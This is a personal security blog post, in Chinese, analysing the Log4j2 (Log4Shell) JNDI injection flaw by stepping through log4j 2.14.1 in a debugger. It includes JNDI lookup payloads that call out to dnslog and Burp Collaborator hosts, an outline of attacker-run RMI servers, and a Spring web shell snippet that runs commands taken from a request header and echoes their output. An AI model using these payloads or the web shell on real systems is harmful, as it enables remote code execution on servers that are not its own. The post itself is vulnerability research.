@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Log4j2探究 | Ja9er&#39;s Studio</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://ja9er.github.io/favicon.ico?v=1642400876014">
+<link rel="stylesheet" href="https://ja9er.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="简单跟一下代码XD
+0X01 搭建环境
+IDEA 生成maven项目，简单配置pom.xml
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;group..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://ja9er.github.io">
+        <img src="https://ja9er.github.io/images/avatar.png?v=1642400876014" class="site-logo">
+        <h1 class="site-title">Ja9er&#39;s Studio</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      燃烧掉总比消失好
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://ja9er.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Log4j2探究</h2>
+            <div class="post-date">2021-12-20</div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>简单跟一下代码XD</strong></p>
+<h1 id="0x01-搭建环境">0X01 搭建环境</h1>
+<p>IDEA 生成maven项目，简单配置pom.xml</p>
+<pre><code class="language-xml">    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<p>生成测试类</p>
+<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.core.lookup.JndiLookup;
+public class test {
+    public static final Logger logger = LogManager.getLogger(test.class);
+    public static void main(String[] args) {
+        System.out.println(&quot;version: 2.14.1&quot;);
+        logger.error(&quot;${jndi:dns://${hostName}.dnslog.cn}&quot;);
+    }
+}
+</code></pre>
+<h1 id="0x02-分析">0x02 分析</h1>
+<h2 id="先问是不是再问有没有">先问是不是，再问有没有</h2>
+<p>因为自己跟很麻烦(主要是因为菜...)，先剽窃一手其他师傅的结论。</p>
+<p>问题点出在<code>org.apache.logging.log4j.core.lookup.JndiLookup</code></p>
+<p>直接打断点</p>
+<p>跟踪断点发现，在测试类中实例化logger类的过程中，</p>
+<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/Tu1taj"><img src="https://s4.ax1x.com/2021/12/20/Tu1taj.png" alt="Tu1taj.png" loading="lazy"></a></figure>
+<p>根据关键词建立对应类的映射关系</p>
+<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/Tu13M8"><img src="https://s4.ax1x.com/2021/12/20/Tu13M8.png" alt="Tu13M8.png" loading="lazy"></a></figure>
+<p>这是一个大前提。</p>
+<p>现在回到JNDILOOKUP，直接在函数<code>lookup</code>中下断点，开始DEBUG。</p>
+<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/Tu1NIs"><img src="https://s4.ax1x.com/2021/12/20/Tu1NIs.png" alt="Tu1NIs.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/Tu1ain"><img src="https://s4.ax1x.com/2021/12/20/Tu1ain.png" alt="Tu1ain.png" loading="lazy"></a></figure>
+<p>可以看到IDEA很方便的给出了调用栈。其实在实际的跟踪过程中发现，红框前面的函数基本都是在套娃。没有具体的动作</p>
+<p><strong>像这样</strong></p>
+<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/Tu10zV"><img src="https://s4.ax1x.com/2021/12/20/Tu10zV.png" alt="Tu10zV.png" loading="lazy"></a></figure>
+<p>随着套娃来到第一个关键点<code>MessagePatternConverter.format()</code>,我们可以看到这里官方主动判断**${**符号，进入replace函数</p>
+<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/Tu1wR0"><img src="https://s4.ax1x.com/2021/12/20/Tu1wR0.png" alt="Tu1wR0.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/Tu1dGq"><img src="https://s4.ax1x.com/2021/12/20/Tu1dGq.png" alt="Tu1dGq.png" loading="lazy"></a></figure>
+<p>replace又是套娃，继续跟进到<code>StrSubstitutor.substitute()</code>,这里对传入的变量处理，剔除出额外的字符串</p>
+<pre><code class="language-java">此时varNameExpr=&quot;jndi:ldap://0tubdem0sszb8wlxw9w0pmpprgx6lv.burpcollaborator.net&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/Tu1rsU"><img src="https://s4.ax1x.com/2021/12/20/Tu1rsU.png" alt="Tu1rsU.png" loading="lazy"></a></figure>
+<p>然后继续处理字符串，最终把值赋给<strong>varname</strong></p>
+<p>等处理过程完成后调用<code>resolveVariable</code>函数，定睛一看，诶怎么就直接冒了一个lookup出来呢?</p>
+<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/Tu16Z4"><img src="https://s4.ax1x.com/2021/12/20/Tu16Z4.png" alt="Tu16Z4.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/Tu1sLF"><img src="https://s4.ax1x.com/2021/12/20/Tu1sLF.png" alt="Tu1sLF.png" loading="lazy"></a></figure>
+<h2 id="揭开谜底-jndilookup在哪里">揭开谜底--JNDILookup在哪里?</h2>
+<p>原来是此时和开始初始化的内容呼应上了</p>
+<p><code>getVariableResolver</code>这个函数获取的内容由<code>return this.variableResolver;</code>返回，返回的是StrSubstitutor这个类的variableResolver，而StrSubstitutor的内容又来自<code>Interpolator</code>类，也就是初始化用到的那个类，值也是之前的。</p>
+<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/Tu1cdJ"><img src="https://s4.ax1x.com/2021/12/20/Tu1cdJ.png" alt="Tu1cdJ.png" loading="lazy"></a></figure>
+<p>进入<code>resolver.lookup</code>可以看到，截取字符串获取前缀prefix,这里就是jndi。</p>
+<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/Tu1RiR"><img src="https://s4.ax1x.com/2021/12/20/Tu1RiR.png" alt="Tu1RiR.png" loading="lazy"></a></figure>
+<p><strong>jndi前缀对应JndILookup</strong>也是初始化后已经建立好的关系。</p>
+<h2 id="可控的lookup变量">可控的lookup变量</h2>
+<p>进入JNDILookup之后就很顺利，继续跟踪函数定位到<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>类的lookup方法.</p>
+<p>到这一步其实已经豁然开朗了，当一个lookup的参数可控无过滤，我们有什么理由不认为这是个<font color='red'><strong>JNDI注入</strong></font>呢？</p>
+<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/Tu1WJ1"><img src="https://s4.ax1x.com/2021/12/20/Tu1WJ1.png" alt="Tu1WJ1.png" loading="lazy"></a></figure>
+<h1 id="0x03-利用">0X03 利用</h1>
+<p>经过分析，可以看到这个漏洞并无什么苛刻的要求。只要是调用了log4j2的记录功能且用户可以控制输入即可。</p>
+<p>简单易用，表现在实战中就是见框就插，header里面除了payload啥都没有(笑)。</p>
+<p>如果想RCE，则需要先写好恶意类，再编译成class。和反序列化的利用过程一模一样。</p>
+<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/Tu1IsO"><img src="https://s4.ax1x.com/2021/12/20/Tu1IsO.png" alt="Tu1IsO.png" loading="lazy"></a></figure>
+<h1 id="0x04-差点什么">0X04 差点什么?</h1>
+<p>麻烦的回弹shell显然没有直接执行命令且回显来的爽快。作为菜鸡也是很羡慕大佬们的操作的。那么，怎么才能把想要的结果回显到网页的中呢?</p>
+<h2 id="理解什么是jndi注入">理解什么是JNDI注入?</h2>
+<blockquote>
+<ol>
+<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
+</ol>
+</blockquote>
+<p>根据原理可知，JNDI注入实际上是去拉取受攻击者控制的恶意服务器上的恶意类回来动态加载。</p>
+<h2 id="回显获取response和request">回显?获取response和request!</h2>
+<p>根据我粗浅的开发经验，只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。</p>
+<h2 id="实践">实践</h2>
+<p>配置一个spring+log4j+mybits靶场</p>
+<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
+<h3 id="response劫持"><strong>response劫持</strong></h3>
+<p>怎么观察中间件的response？在返回时打断点</p>
+<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/Tu1oLD"><img src="https://s4.ax1x.com/2021/12/20/Tu1oLD.md.png" alt="Tu1oLD.md.png" loading="lazy"></a></figure>
+<p><strong>通过及时表达式，手动查看当前线程上下文(也就是Thread.currentThread())的threadLocals</strong></p>
+<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/Tu18sS"><img src="https://s4.ax1x.com/2021/12/20/Tu18sS.png" alt="Tu18sS.png" loading="lazy"></a></figure>
+<p>通过查看threadlocals的tables的值找到request和response所在的位置，这里是14</p>
+<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/Tu1Gqg"><img src="https://s4.ax1x.com/2021/12/20/Tu1Gqg.png" alt="Tu1Gqg.png" loading="lazy"></a></figure>
+<p><strong>修改response的输出流</strong></p>
+<pre><code class="language-java">((ServletRequestAttributes) Thread.currentThread().threadLocals.table[14].value).response.getOutputStream().println(&quot;change response----------------------------&quot;)
+</code></pre>
+<p><strong>这里可以用</strong> <strong>getOutputStream 或者 getwrite 具体看报错</strong></p>
+<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/Tu1lxf"><img src="https://s4.ax1x.com/2021/12/20/Tu1lxf.png" alt="Tu1lxf.png" loading="lazy"></a></figure>
+<p>最后放包得到响应，可以看到结果之前多了我们修改的字符</p>
+<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/Tu1YZQ"><img src="https://s4.ax1x.com/2021/12/20/Tu1YZQ.png" alt="Tu1YZQ.png" loading="lazy"></a></figure>
+<h3 id="可回显的spring马">可回显的spring马</h3>
+<p>上面只是研究了一下怎么简单的更改回显。实际需要改的地方还是很多的。</p>
+<p>实际上spring有自己获取request和response的地方</p>
+<p>https://github.com/feihong-cs/Java-Rce-Echo</p>
+<pre><code class="language-java">org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
+        
+javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
+        
+javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
+
+        String cmd = httprequest.getHeader(&quot;cmd&quot;);
+		if(cmd != null &amp;&amp; !cmd.isEmpty()){
+			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
+			httpresponse.getWriter().println(res);
+		}
+</code></pre>
+<p>我们改改就可以用</p>
+<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Tu1fRx"><img src="https://s4.ax1x.com/2021/12/20/Tu1fRx.md.png" alt="Tu1fRx.md.png" loading="lazy"></a></figure>
+<h3 id="效果">效果</h3>
+<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TKSREQ"><img src="https://s4.ax1x.com/2021/12/21/TKSREQ.png" alt="TKSREQ.png" loading="lazy"></a></figure>
+<h1 id="0x05-结语">0x05 结语</h1>
+<p>LOL</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://ja9er.github.io/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/">
+                  <h3 class="post-title">
+                    CMSEASY-从黑盒到代码审计
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
